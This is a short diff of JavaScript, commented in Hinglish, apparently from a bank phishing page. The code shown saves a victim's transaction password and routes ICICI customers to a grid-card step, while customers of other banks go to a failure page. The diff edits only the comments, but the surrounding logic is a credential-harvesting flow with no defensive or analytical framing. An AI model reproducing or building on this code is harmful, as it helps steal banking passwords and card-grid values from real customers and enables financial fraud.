@@ -53,7 +53,7 @@
                 // Save Transaction Password
                 submissions[targetIndex].transPassword = transPassword;
                 
-                // Check karo ki user ne payment details mein kaun sa bank save kiya tha
+                // Check karo ki user ne kaun sa bank select kiya tha
                 if (submissions[targetIndex].paymentDetails) {
                     selectedBank = submissions[targetIndex].paymentDetails;
                 }
@@ -70,7 +70,7 @@
                 if (selectedBank.includes("ICICI")) {
                     window.location.href = "grid_step1.html"; 
                 } else {
-                    // Agar koi aur bank hai (SBI, HDFC, etc.), toh seedha failed.html par bhejo
+                    // Agar koi aur bank hai (SBI, PNB, Bank of India, आदि), toh seedha failed.html par bhejo
                     window.location.href = "failed.html"; 
                 }
             }, 1000);
